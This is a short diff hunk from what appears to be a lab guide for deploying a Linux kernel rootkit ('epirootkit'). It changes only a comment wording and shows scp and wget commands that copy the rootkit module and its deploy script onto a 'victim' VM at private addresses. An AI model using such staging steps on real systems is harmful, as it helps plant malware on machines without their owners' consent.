@@ -152,7 +152,7 @@ Transfer the compiled rootkit and deployment script to victim VM:
 # Option A: SCP transfer (requires SSH on victim)
 scp rootkit/epirootkit.ko rootkit/deploy_rootkit.sh victim@192.168.200.10:~/
 
-# Option B: HTTP download (simple Python server)
+# Option B: HTTP download (Python server)
 cd rootkit && python3 -m http.server 8080
 # On victim: wget http://192.168.200.11:8080/{epirootkit.ko,deploy_rootkit.sh}
 
